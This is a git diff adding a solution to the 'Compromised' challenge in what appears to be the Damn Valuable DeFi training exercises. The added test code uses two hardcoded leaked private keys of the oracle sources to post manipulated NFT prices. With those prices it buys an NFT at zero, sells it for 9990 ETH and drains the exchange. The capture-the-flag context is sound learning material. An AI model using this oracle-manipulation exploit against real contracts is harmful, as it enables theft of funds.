@@ -1,5 +1,6 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
+const privateKeyToPublicKey = require('ethereum-private-key-to-public-key')
 
 describe('Compromised challenge', function () {
 
@@ -58,9 +59,31 @@ describe('Compromised challenge', function () {
         );
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
-
+    // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+    // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        const source1 = new ethers.Wallet(key1,ethers.provider);
+        const source2 = new ethers.Wallet(key2,ethers.provider);
+
+        await this.oracle.connect(source1).postPrice('DVNFT',0);
+        await this.oracle.connect(source2).postPrice('DVNFT',0);
+        
+        await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther('0.01')})
+
+        await this.oracle.connect(source1).postPrice('DVNFT',ethers.utils.parseEther('9990'));
+        await this.oracle.connect(source2).postPrice('DVNFT',ethers.utils.parseEther('9990'));
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address,0)
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await this.oracle.connect(source1).postPrice('DVNFT',ethers.utils.parseEther('999'));
+        await this.oracle.connect(source2).postPrice('DVNFT',ethers.utils.parseEther('999'));
+
+
     });
 
     after(async function () {
